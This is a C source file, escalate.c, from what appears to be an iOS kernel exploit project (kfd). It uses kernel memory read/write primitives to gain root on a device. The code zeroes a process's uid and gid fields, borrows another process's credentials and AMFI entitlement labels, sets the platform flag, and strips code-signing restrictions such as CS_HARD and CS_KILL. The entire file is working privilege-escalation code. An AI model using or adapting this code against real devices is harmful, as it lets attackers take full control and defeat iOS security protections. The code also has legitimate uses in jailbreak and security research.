//
//  escalate.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//
#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include "krw.h"
#include "offsets.h"
#include "proc.h"
#include "escalate.h"
#include "stage2.h"


extern char **environ;

uint64_t borrow_entitlements(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void unborrow_entitlements(pid_t to_pid, uint64_t to_amfi) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
}

uint64_t borrow_ucreds(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = get_ucred(to_proc);
    uint64_t from_ucred = get_ucred(from_proc);
    
    kwrite64(to_proc + off_p_ucred, from_ucred);
    
    return to_ucred;
}

void unborrow_ucreds(pid_t to_pid, uint64_t to_ucred) {
    uint64_t to_proc = proc_of_pid(to_pid);
    
    kwrite64(get_ucred(to_proc), to_ucred);
}

bool rootify(pid_t pid) {
    if (!pid) return false;

    uint64_t proc = proc_of_pid(pid);
    printf("[i] Kernel proc:  0x%llx\n", proc);
    uint64_t ucred = get_ucred(proc);
    printf("[i] Kernel ucred:  0x%llx\n", ucred);
    //make everything 0 without setuid(0), pretty straightforward.
    kwrite32(proc + off_p_uid, 0);
    kwrite32(proc + off_p_ruid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
    kwrite32(ucred + off_u_cr_uid, 0);
    kwrite32(ucred + off_u_cr_ruid, 0);
    kwrite32(ucred + off_u_cr_svuid, 0);
    kwrite32(ucred + off_u_cr_ngroups, 1);
    kwrite32(ucred + off_u_cr_groups, 0);
    kwrite32(ucred + off_u_cr_rgid, 0);
    kwrite32(ucred + off_u_cr_svgid, 0);
    
    printf("[DEBUG] proc + off_p_uid:  0x%x\n", kread32(proc + off_p_uid));
    printf("[DEBUG] proc + off_p_ruid: 0x%x\n", kread32(proc + off_p_ruid));
    printf("[DEBUG] proc + off_p_gid:  0x%x\n", kread32(proc + off_p_gid));
    printf("[DEBUG] proc + off_p_rgid: 0x%x\n", kread32(proc + off_p_rgid));
    printf("[DEBUG] ucred + off_u_cr_uid:     0x%x\n", kread32(ucred + off_u_cr_uid));
    printf("[DEBUG] ucred + off_u_cr_ruid:    0x%x\n", kread32(ucred + off_u_cr_ruid));
    printf("[DEBUG] ucred + off_u_cr_svuid:   0x%x\n", kread32(ucred + off_u_cr_svuid));
    printf("[DEBUG] ucred + off_u_cr_ngroups: 0x%x\n", kread32(ucred + off_u_cr_ngroups));
    printf("[DEBUG] ucred + off_u_cr_groups:  0x%x\n", kread32(ucred + off_u_cr_groups));
    printf("[DEBUG] ucred + off_u_cr_rgid:    0x%x\n", kread32(ucred + off_u_cr_rgid));
    printf("[DEBUG] ucred + off_u_cr_svgid:   0x%x\n", kread32(ucred + off_u_cr_svgid));

    return (kread32(proc + off_p_uid) == 0) ? true : false;
    return false;
}

uint64_t run_borrow_entitlements(pid_t to_pid, char* from_path) {
    posix_spawnattr_t attrp;
    posix_spawnattr_init(&attrp);
    posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED);
    
    NSString *from_path_ns = [NSString stringWithUTF8String:from_path];
    char *last_process = [[from_path_ns componentsSeparatedByString:@"/"] lastObject].UTF8String;
    
    pid_t from_pid;
    const char *argv[] = {last_process, NULL};
    int retVal = posix_spawn(&from_pid, from_path, NULL, &attrp, (char* const*)argv, environ);
    if(retVal < 0) {
        printf("Couldn't posix_spawn.\n");
        return -1;
    }
    
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);
    
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    uint64_t to_amfi = kread64(to_cr_label + off_amfi_slot);
    uint64_t from_amfi = kread64(from_cr_label + off_amfi_slot);
    
    kwrite64(to_cr_label + off_amfi_slot, from_amfi);
    
    return to_amfi;
}

void kill_unborrow_entitlements(pid_t to_pid, uint64_t to_amfi, pid_t kill_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    
    kwrite64(to_cr_label + off_amfi_slot, to_amfi);
    
    kill(kill_pid, SIGKILL);
}

bool set_task_platform(pid_t pid, bool set) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);
    
    if (set) {
        t_flags |= TF_PLATFORM;
    } else {
        t_flags &= ~(TF_PLATFORM);
    }
    
    kwrite32(task + off_task_t_flags, t_flags);
    
    return true;
}

void set_proc_csflags(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint32_t csflags = 0;
    if(off_p_csflags == 0x1c) {
        uint64_t self_ro = kread64(proc + 0x20);
        csflags = kread32(self_ro + off_p_csflags);
    } else {
        csflags = kread32(proc + off_p_csflags);
    }
    printf("[i] csflags before: 0x%x\n", csflags);
    csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    printf("[i] csflags will:   0x%x\n", csflags);
    if(off_p_csflags == 0x1c) {
        uint64_t self_ro = kread64(proc + 0x20);
        kwrite32(self_ro + off_p_csflags, csflags); // error
    } else {
        kwrite32(proc + off_p_csflags, csflags);
    }
}

uint64_t get_cs_blob(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);
    uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
    return kread64(ubcinfo + off_ubc_info_cs_blobs);
}

void set_csb_platform_binary(pid_t pid) {
    uint64_t cs_blob = get_cs_blob(pid);
    kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
}

void platformize(pid_t pid) {
    set_task_platform(pid, true);
    set_proc_csflags(pid);
    set_csb_platform_binary(pid);
}
